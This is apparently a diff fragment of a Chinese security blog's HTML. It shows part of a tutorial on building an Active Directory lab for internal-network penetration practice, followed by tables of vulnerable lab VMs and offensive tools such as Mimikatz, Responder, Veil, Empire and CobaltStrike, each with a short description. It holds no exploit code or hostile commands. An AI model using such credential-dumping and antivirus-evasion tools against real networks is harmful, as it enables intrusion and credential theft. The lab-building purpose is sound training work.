+<p>域控安装成功以后，他会将自己在域里的角色，注册到DNS的服务器里面，以让域里的其他计算机，能够通过这个DNS服务器来找到这台计算机。<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217234451887-368049108.png"></p>
+<p>可以看到dc主机的记录，可以看到我们的域控 hack.testlab已经正确的将主机和ip地址注册到DNS服务器，域里的其他机器就可以通过这个找到域控。</p>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217234711480-159347675.png"></p>
+<p>看到这个ldap表示我们的域控已经正确的注册为域控制器了。也看到了这个gc 全局边路</p>
+<ul>
+<li>创建Active Directory用户<br>为windows server 2008 r2 和 windows 7用户创建控制器账户<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217225020607-1669632187.png"><br>也可以在 控制面板 -&gt; 系统与安全 -&gt; 管理工具里打开<br>选择Users目录，右键，新建对象–用户，创建一个testuser账户<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230217235358341-292561242.png"><br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230218000003933-538413216.png"><br>可以看到添加了一个普通的域用户 testuser</li>
+</ul>
+<h4 id="Windows7设置"><a href="#Windows7设置" class="headerlink" title="Windows7设置"></a>Windows7设置</h4><ul>
+<li><p>设置ip与DNS服务器地址<br>控制面板 -&gt; 网络和Internet -&gt; 更改适配器设置 -&gt; Internet协议版本(TCP&#x2F;IPv4)属性<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230218000718639-1136831396.png"><br>设置完之后可以 ping以下我们的域控，DNS的ip地址 看看能不能ping通</p>
+</li>
+<li><p>加入域<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230218001121418-1990414935.png"><br>这里需要输入以下域的账号和密码。这里我们输入新建的testuser，确定<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230218001905097-1987957690.png"></p>
+</li>
+</ul>
+<p>现在呢 windows7算是加入域成功啦！</p>
+<p>然后提示必须重新启动计算机，点击确认 开始重新启动。</p>
+<p>重启之后，可以用域控管理员账号密码、也可以用新建的那个testuer域普通用户去登录。当然这两个用户权限是不一样的。</p>
+<p>现在呢还是我们本机的 WiNDOWS7\1vxyz<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230218002501366-53649355.png"></p>
+<p>这里我们切换用户，我们用普通的域账号登录一下。 </p>
+<p>现在可以看到了，成功登录进去啦。现在已经算所域环境了。这两台机子 构成了一个小型 Mini域了</p>
+<p>ping一下我们域控的ip地址 和 DNS域名 都是没有问题的<br><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230218002816476-1427467031.png"></p>
+<h4 id="Windows-2008-R2设置"><a href="#Windows-2008-R2设置" class="headerlink" title="Windows 2008 R2设置"></a>Windows 2008 R2设置</h4><p>同Windows7，设置ip为192.168.1.3 和DNS服务器 192.168.1.1<br>然后加入域</p>
+<h4 id="DC管理域内计算机"><a href="#DC管理域内计算机" class="headerlink" title="DC管理域内计算机"></a>DC管理域内计算机</h4><p>在computers里，右键win2008机器，点管理 </p>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230218142902170-668500545.png"></p>
+<p>弹⚠了，我们去win2008那边关掉防火墙再回来</p>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230218143007858-438119564.png"></p>
+<p>就可以远程对这个电脑，用户、磁盘管理、等等进行管理</p>
+<p><img src="https://img2023.cnblogs.com/blog/3074366/202302/3074366-20230218143117816-1422697493.png"></p>
+<h2 id="2-其他漏洞学习环境搭建"><a href="#2-其他漏洞学习环境搭建" class="headerlink" title="(2) 其他漏洞学习环境搭建"></a>(2) 其他漏洞学习环境搭建</h2><table>
+<thead>
+<tr>
+<th>漏洞靶场</th>
+<th>靶场描述</th>
+<th>下载地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Metasploit2</td>
+<td>Ubuntu Linux的虚拟机，内置了常见的漏洞其默认的用户名和密码都是msfadmin</td>
+<td><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/metasploitable/files/Metasploitable2/">https://sourceforge.net/projects/metasploitable/files/Metasploitable2/</a></td>
+</tr>
+<tr>
+<td>Metasploit3</td>
+<td>Metasploit3的升级版，默认密码还是msfadmin</td>
+<td><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploitable3">https://github.com/rapid7/metasploitable3</a></td>
+</tr>
+<tr>
+<td>OWASPBWA</td>
+<td>一款基于虚拟机的渗透测试工具，提供一个存在大量漏洞的网站应用程序环境</td>
+<td><a target="_blank" rel="noopener" href="https://sourceforge.net/projects/owaspbwa/files/">https://sourceforge.net/projects/owaspbwa/files/</a></td>
+</tr>
+</tbody></table>
+<table>
+<thead>
+<tr>
+<th>内网靶场</th>
+<th>靶场描述</th>
+<th>下载地址</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>红日靶场</td>
+<td>vultargeta靶场是星期五实验室公众号发布的自行设计靶场,其中涵盖了WEB渗透、主机漏洞、域漏洞、工控漏洞</td>
+<td><a target="_blank" rel="noopener" href="http://vulnstack.qiyuanxuetang.net/vuln/">http://vulnstack.qiyuanxuetang.net/vuln/</a></td>
+</tr>
+<tr>
+<td>CFS三层内网</td>
+<td>三层靶机的内网渗透，常用于CTF比赛</td>
+<td><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/187908">https://www.anquanke.com/post/id/187908</a></td>
+</tr>
+<tr>
+<td>Social Network</td>
+<td>Vulnhub上的一台靶机</td>
+<td><a target="_blank" rel="noopener" href="http://www.yongyindai.com/plus/view.php?aid=62">http://www.yongyindai.com/plus/view.php?aid=62</a></td>
+</tr>
+</tbody></table>
+<h2 id="3-内网渗透常用工具"><a href="#3-内网渗透常用工具" class="headerlink" title="(3) 内网渗透常用工具"></a>(3) 内网渗透常用工具</h2><h3 id="1-windows平台常用工具"><a href="#1-windows平台常用工具" class="headerlink" title="1. windows平台常用工具"></a>1. windows平台常用工具</h3><table>
+<thead>
+<tr>
+<th>工具名称</th>
+<th>介绍描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Nmap</td>
+<td>信息收集与网络发现工具，用于发现主机，端口扫描，识别服务，识别操作系统等</td>
+</tr>
+<tr>
+<td>Wireshark</td>
+<td>免费开源的网络协议和数据包分析器，将网络接口设置为混杂模式能够监控整个网络的流量</td>
+</tr>
+<tr>
+<td>PUTTY</td>
+<td>免费开源的SSH和Telnet客户端，主要用于远程访问</td>
+</tr>
+<tr>
+<td>Sqlmap</td>
+<td>免费开源，主要用来对WEB应用程序进行SQL注入攻击测试，只是不同数据库</td>
+</tr>
+<tr>
+<td>Burpsuite</td>
+<td>主要用于对WEB应用程序进行安全测试的集成平台</td>
+</tr>
+<tr>
+<td>Hydra</td>
+<td>网络登录的破解工具，支持多种协议</td>
+</tr>
+<tr>
+<td>Getif</td>
+<td>基于windows的免费图形界面工具，用于收集SNMP设备的信息 Cain&amp;Able 强有力的嗅探工具与密码破解</td>
+</tr>
+<tr>
+<td>PowerSploit</td>
+<td>基于PowerShell的后渗透框架,包含很多PowerShell攻击脚本,主要用于信息侦查,权限提升,权限维持</td>
+</tr>
+<tr>
+<td>Nishang</td>
+<td>Powershell脚本和有效载荷的框架的集合</td>
+</tr>
+</tbody></table>
+<h3 id="2-Linux平台常用工具"><a href="#2-Linux平台常用工具" class="headerlink" title="2. Linux平台常用工具"></a>2. Linux平台常用工具</h3><table>
+<thead>
+<tr>
+<th>工具名称</th>
+<th>介绍描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>WCE</td>
+<td>Windows凭据管理器，列出登录会话，添加&#x2F;修改&#x2F;列出&#x2F;删除关联凭据（LM HASH&#x2F;NTML HASH&#x2F;明文密码&#x2F;Kerberos票据）</td>
+</tr>
+<tr>
+<td>Mimikatz</td>
+<td>用于从内存中获取明文密码，现金票据和秘钥等</td>
+</tr>
+<tr>
+<td>Responder</td>
+<td>嗅探网络内所有LLMNR包和获取各主机的信息</td>
+</tr>
+<tr>
+<td>Beff</td>
+<td>一款针对浏览器的渗透测试工具</td>
+</tr>
+<tr>
+<td>DSHashes</td>
+<td>从NTDSXtract中提取用于易于理解的散列值</td>
+</tr>
+<tr>
+<td>Powersploit</td>
+<td>基于PowerShell的后渗透框架,包含很多PowerShell攻击脚本,主要用于信息侦查,权限提升,权限维持</td>
+</tr>
+<tr>
+<td>Nishang</td>
+<td>针对Powershell的渗透测试工具，集成了框架，脚本和各种payload</td>
+</tr>
+<tr>
+<td>Empire</td>
+<td>内网渗透利器，跨平台，有丰富的模块和接口，用于可自行添加模块和功能</td>
+</tr>
+<tr>
+<td>ps_encoder.py</td>
+<td>使用base64编码封装的powershell命令包，目的是混淆和压缩代码</td>
+</tr>
+<tr>
+<td>smbexec</td>
+<td>使用Samba工具的快速psexec类工具</td>
+</tr>
+<tr>
+<td>Veil</td>
+<td>生成绕过常见的防病毒解决方案的Metasploit有效载荷</td>
+</tr>
+<tr>
+<td>Metasploit</td>
+<td>漏洞攻击平台&#x2F;5大框架：exploit&#x2F;auxiliary&#x2F;payload&#x2F;post&#x2F;encoder</td>
+</tr>
+<tr>
+<td>CobaltStrike</td>
+<td>优秀的后渗透测试平台，主要用于内网渗透适合团队间协同工作</td>
+</tr>
+</tbody></table>
+<p>参考：<a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1JA411x7HM/">https://www.bilibili.com/video/BV1JA411x7HM/</a></p>
+
+    
+
+    
+
+    
+
+  </div>
+  <div class="article-info article-info-index">
+    
+    
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">内网渗透</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+    
+
+    
+    <p class="article-more-link">
+      <a class="article-more-a" href="/2023/09/20/%E7%AC%AC%E4%B8%80%E7%AB%A0-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/">展开全文 >></a>
+    </p>
+    
+
+    
+    <div class="clearfix"></div>
+  </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-2023蓝帽杯半决赛电子取证" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -482,6 +1689,18 @@
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color3">CTF比赛wp</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">内网靶场</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">环境配置</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">内网渗透</a>
               </li>
             
             <div class="clearfix"></div>
